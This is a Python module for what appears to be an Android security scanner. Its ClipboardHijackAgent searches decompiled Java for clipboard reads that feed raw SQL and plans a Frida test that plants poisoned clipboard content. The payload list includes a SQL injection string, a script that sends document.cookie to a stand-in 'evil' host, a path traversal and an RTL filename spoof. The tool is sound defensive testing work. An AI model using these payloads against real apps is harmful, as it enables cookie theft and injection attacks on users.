"""D_059 — Clipboard paste-poisoning (Dynamic Testing Target)."""
from __future__ import annotations

import logging
import re

from sentinel.agents.base.base_agent import BaseAgent
from sentinel.core.finding import Finding, Severity

logger = logging.getLogger(__name__)
_PASTE_MARKERS_RE = re.compile(
    r"ClipboardManager.*getPrimaryClip|getItemAt\s*\(\s*0\s*\)\s*\.\s*getText"
)
_PASTE_TO_SQL_RE = re.compile(
    r"getText\s*\(\s*\)[^;]{0,200}(rawQuery|execSQL|appendWhere)"
)
_PASTE_PAYLOADS = [
    "' OR 1=1--",
    "<script>fetch('//evil/'+document.cookie)</script>",
    "javascript:alert(1)",
    "../../etc/hosts",
    "‮ gnitset for-Etemoh.exe",
]


class ClipboardHijackAgent(BaseAgent):
    AGENT_ID = "D_059"
    VULN_CLASS = "Clipboard Paste-Poisoning (Dynamic Testing Target)"
    PHASE = "Phase 2"

    async def is_applicable(self) -> bool:
        return bool(
            self._context.decompiled_dir
            and self._context.decompiled_dir.exists()
        )

    async def analyze(self) -> list[Finding]:
        root = self._context.decompiled_dir
        if root is None:
            return []
        candidates: set[str] = set()
        sqli_routes: set[str] = set()
        scanned = 0
        for path in root.rglob("*.java"):
            scanned += 1
            if scanned > 2000:
                break
            try:
                text = path.read_text(encoding="utf-8", errors="replace")
            except OSError:
                continue
            if not _PASTE_MARKERS_RE.search(text):
                continue
            rel = str(path.relative_to(root))
            candidates.add(rel)
            if _PASTE_TO_SQL_RE.search(text):
                sqli_routes.add(rel)
        if not candidates:
            return []
        severity = Severity.HIGH if sqli_routes else Severity.MEDIUM
        return [self._make_finding(
            vuln_class=self.VULN_CLASS,
            severity=severity,
            confidence=0.65,
            recommendation=(
                f"{len(candidates)} clipboard-read site(s); "
                f"{len(sqli_routes)} route(s) feed paste content into raw SQL. "
                "The Frida hook will plant 5 malicious payloads on the "
                "system clipboard (SQLi, XSS, JS URI, traversal, RTL "
                "override) then trigger the app's paste handler and "
                "observe downstream sinks. Always treat clipboard content "
                "as untrusted user input — validate and reject."
            ),
            evidence={
                "paste_handlers": sorted(candidates)[:10],
                "paste_to_sql_routes": sorted(sqli_routes)[:5],
                "dynamic_target": True,
                "frida_payload": {
                    "poison_payloads": _PASTE_PAYLOADS,
                    "trigger_method": "ClipboardManager.setPrimaryClip",
                    "monitor_sinks": ["rawQuery", "evaluateJavascript", "loadUrl"],
                    "safety_budget": {
                        "max_actions_total": 10,
                        "max_actions_per_sec": 1,
                        "wall_clock_budget_s": 30,
                        "max_consecutive_crashes": 2,
                    },
                },
            },
        )]


__all__ = ["ClipboardHijackAgent"]
